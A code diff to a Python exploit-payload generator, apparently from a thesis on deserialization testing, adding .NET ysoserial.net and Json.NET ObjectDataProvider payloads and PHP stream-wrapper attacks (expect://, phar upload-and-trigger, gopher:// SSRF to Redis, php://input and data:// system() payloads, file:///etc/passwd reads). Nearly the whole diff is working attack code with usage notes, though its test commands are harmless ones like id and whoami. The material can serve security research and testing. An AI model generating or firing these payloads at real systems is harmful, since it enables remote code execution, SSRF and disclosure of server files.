@@ -3,10 +3,14 @@ import base64
 import os
 import re
 import pickle
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from tool_config import get_tool_path
 
 class PayloadMutation:
 
-    YSOSERIAL_PATH = "D:\\Thesis\\Analyze\\third_tool\\java\\ysoserial-all.jar"
+    YSOSERIAL_PATH = get_tool_path("ysoserial")
 
     TEST_COMMANDS = ["id", "whoami", "hostname"]
 
@@ -44,7 +48,7 @@ class PayloadMutation:
             return self._mutate_java()
         if self.probe == "urldns_probe":
             return self._mutate_java_urldns()
-        if self.probe == "gadget_chain":
+        if self.probe in ("gadget_chain", "magic_method"):
             return self._php_mutation()
         if self.probe in ("flip_boolean", "modify_string","modify_integer"):
             return self.__mutated_php_choose()
@@ -56,6 +60,12 @@ class PayloadMutation:
             return self._mutate_nodejs()
         if self.probe == "ruby_marshal":
             return self._mutate_ruby()
+        if self.probe in ("viewstate", "dotnet_deser"):
+            return self._mutate_dotnet_viewstate()
+        if self.probe == "jsonnet":
+            return self._mutate_dotnet_jsonnet()
+        if self.probe in ("rce", "phar_deser", "ssrf", "php_input", "lfi", "code_inject", "traversal", "stream"):
+            return self._mutate_wrapper()
         return []
 
 
@@ -171,7 +181,7 @@ class PayloadMutation:
     
     ##PHP
     
-    PHPGGC_PATH = "D:\\Thesis\\Analyze\\third_tool\\phpggc"
+    PHPGGC_PATH = get_tool_path("phpggc")
     
     PHP_GADGET_CHAINS_MAP = {
     "monolog": [
@@ -569,3 +579,247 @@ class PayloadMutation:
             results.append(payload)
 
         return results
+
+    ## .NET
+
+    YSOSERIALNET_PATH = get_tool_path("ysoserial_net")
+
+    DOTNET_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    DOTNET_GADGETS = [
+        "TypeConfuseDelegate",
+        "ObjectDataProvider",
+        "ActivitySurrogateSelector",
+    ]
+
+    DOTNET_FORMATTER_MAP = {
+        "binaryformatter": "BinaryFormatter",
+        "objectstateformatter": "ObjectStateFormatter",
+        "losformatter": "LosFormatter",
+        "netdatacontractserializer": "NetDataContractSerializer",
+    }
+
+    def _resolve_dotnet_formatter(self) -> str:
+        for kw, formatter in self.DOTNET_FORMATTER_MAP.items():
+            if kw in self.etype.lower():
+                return formatter
+        return "BinaryFormatter"
+
+    def _run_ysoserialnet(self, formatter: str, gadget: str, command: str) -> str | None:
+        try:
+            cmd = [
+                self.YSOSERIALNET_PATH,
+                "-f", formatter,
+                "-g", gadget,
+                "-c", command,
+                "-o", "base64",
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+            if result.returncode == 0 and result.stdout.strip():
+                return result.stdout.strip()
+            return None
+        except subprocess.TimeoutExpired:
+            print(f"[!] Timeout: {gadget}")
+            return None
+        except FileNotFoundError:
+            return None
+
+    def _mutate_dotnet_viewstate(self) -> list[dict]:
+        results = []
+        formatter = self._resolve_dotnet_formatter()
+
+        if not os.path.exists(self.YSOSERIALNET_PATH):
+            return [{
+                "error": "ysoserial.net not found",
+                "hint": f"Place ysoserial.exe at: {self.YSOSERIALNET_PATH}",
+                "command": f"ysoserial.exe -f {formatter} -g TypeConfuseDelegate -c 'id' -o base64",
+            }]
+
+        for gadget in self.DOTNET_GADGETS:
+            for cmd in self.DOTNET_TEST_COMMANDS:
+                b64 = self._run_ysoserialnet(formatter, gadget, cmd)
+                if b64:
+                    payload = self._make_payload("dotnet_deser", f"{formatter}/{gadget}", cmd, b64)
+                    payload["note"] = "For ViewState, target must have MAC validation disabled or key must be known/leaked"
+                    results.append(payload)
+
+        return results
+
+    def _mutate_dotnet_jsonnet(self) -> list[dict]:
+        results = []
+        for cmd in self.DOTNET_TEST_COMMANDS:
+            raw = (
+                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
+                'Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",'
+                '"MethodName":"Start",'
+                '"MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1'
+                '[[System.String, mscorlib]], System.ObjectModel",'
+                f'"$values":["cmd","/c {cmd}"]}},'
+                '"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
+            )
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("jsonnet_typeconfusion", "ObjectDataProvider", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = "Requires target to use TypeNameHandling.All/Objects/Auto with a weakly-typed property"
+            results.append(payload)
+        return results
+
+    ## Wrapper
+
+    GOPHERUS_PATH = get_tool_path("gopherus")
+
+    WRAPPER_TEST_COMMANDS = ["id", "whoami", "hostname"]
+
+    def _mutate_wrapper(self) -> list[dict]:
+        if self.probe == "rce":
+            return self._mutate_wrapper_expect()
+        if self.probe == "phar_deser":
+            return self._mutate_wrapper_phar()
+        if self.probe == "ssrf":
+            return self._mutate_wrapper_ssrf()
+        if self.probe == "php_input":
+            return self._mutate_wrapper_php_input()
+        if self.probe == "code_inject":
+            return self._mutate_wrapper_data()
+        if self.probe == "lfi":
+            return self._mutate_wrapper_lfi()
+        if self.probe == "traversal":
+            return self._mutate_wrapper_traversal()
+        if self.probe == "stream":
+            return self._mutate_wrapper_stream()
+        return []
+
+    def _mutate_wrapper_expect(self) -> list[dict]:
+        results = []
+        for cmd in self.WRAPPER_TEST_COMMANDS:
+            raw = f"expect://{cmd}"
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("wrapper_expect", "expect://", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = "Requires the 'expect' PHP extension to be enabled on the target"
+            results.append(payload)
+        return results
+
+    def _mutate_wrapper_phar(self) -> list[dict]:
+        results = []
+        chains = self.__resolve_php_chain()
+
+        if not os.path.exists(self.PHPGGC_PATH):
+            return [{
+                "error": "phpggc not found",
+                "hint": f"Place phpggc at: {self.PHPGGC_PATH}",
+                "command": f"php phpggc {chains[0]} system id -p phar -o payload.phar",
+            }]
+
+        for chain in list(chains)[:3]:
+            for ptype in self.PHP_TYPE:
+                for cmd in self.TEST_COMMANDS:
+                    try:
+                        proc = subprocess.run(
+                            ["php", self.PHPGGC_PATH, chain, ptype, cmd, "-p", "phar", "-o", "-"],
+                            capture_output=True, timeout=15,
+                        )
+                    except (subprocess.TimeoutExpired, FileNotFoundError):
+                        continue
+
+                    if proc.returncode != 0 or not proc.stdout:
+                        continue
+
+                    b64 = base64.b64encode(proc.stdout).decode()
+                    payload = self._make_payload("wrapper_phar", chain, cmd, b64)
+                    payload["note"] = (
+                        "Upload this .phar to the target (e.g. via avatar/file upload), then trigger "
+                        "deserialization by referencing phar://<uploaded_path>/test.txt in a "
+                        "file-operation sink (file_exists, is_file, fopen, etc.)"
+                    )
+                    results.append(payload)
+
+        return results
+
+    def _mutate_wrapper_ssrf(self) -> list[dict]:
+        if os.path.exists(self.GOPHERUS_PATH):
+            try:
+                proc = subprocess.run(
+                    ["python", self.GOPHERUS_PATH, "--exploit", "redis"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                if proc.returncode == 0 and proc.stdout.strip():
+                    raw = proc.stdout.strip()
+                    b64 = base64.b64encode(raw.encode()).decode()
+                    payload = self._make_payload("wrapper_ssrf_gopher", "gopherus/redis", None, b64)
+                    payload["payload_raw"] = raw
+                    payload["note"] = "Generated via Gopherus — review before use, may contain destructive Redis commands"
+                    return [payload]
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+
+        host = self._extract_host()
+        raw = f"gopher://{host}:6379/_INFO%0D%0A"
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("wrapper_ssrf_gopher", "manual/redis-info-probe", None, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = (
+            "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
+            "Gopherus not found — install for richer Redis/Memcached RCE payloads."
+        )
+        return [payload]
+
+    def _mutate_wrapper_php_input(self) -> list[dict]:
+        results = []
+        for cmd in self.WRAPPER_TEST_COMMANDS:
+            raw = f"<?php system('{cmd}'); ?>"
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("wrapper_php_input", "php://input", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                "Send this as the raw POST body while the vulnerable parameter/include points to php://input"
+            )
+            results.append(payload)
+        return results
+
+    def _mutate_wrapper_data(self) -> list[dict]:
+        results = []
+        for cmd in self.WRAPPER_TEST_COMMANDS:
+            code = f"<?php system('{cmd}'); ?>"
+            data_uri = f"data://text/plain;base64,{base64.b64encode(code.encode()).decode()}"
+            b64 = base64.b64encode(data_uri.encode()).decode()
+            payload = self._make_payload("wrapper_data", "data://", cmd, b64)
+            payload["payload_raw"] = data_uri
+            payload["note"] = "Requires the sink to include()/require() the wrapper output as PHP code"
+            results.append(payload)
+        return results
+
+    def _mutate_wrapper_lfi(self) -> list[dict]:
+        targets = [
+            ("file:///etc/passwd", "Unix credential file"),
+            ("file://C:\\Windows\\win.ini", "Windows config file"),
+            ("php://filter/convert.base64-encode/resource=index.php", "Source code disclosure"),
+        ]
+        results = []
+        for raw, desc in targets:
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("wrapper_lfi", desc, None, b64)
+            payload["payload_raw"] = raw
+            results.append(payload)
+        return results
+
+    def _mutate_wrapper_traversal(self) -> list[dict]:
+        raw = "glob:///etc/*"
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("wrapper_traversal", "glob://", None, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = "Lists directory contents via glob:// stream wrapper — adjust path per target OS"
+        return [payload]
+
+    def _mutate_wrapper_stream(self) -> list[dict]:
+        raw = "compress.zlib://php://filter/convert.base64-encode/resource=index.php"
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("wrapper_stream", "compress.zlib://", None, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = "Chained stream wrapper demonstrating filter+compression stacking"
+        return [payload]
+
+    def _extract_host(self) -> str:
+        url = self.vector.get("url") or ""
+        match = re.search(r"://([^/:]+)", url)
+        return match.group(1) if match else "TARGET_HOST"
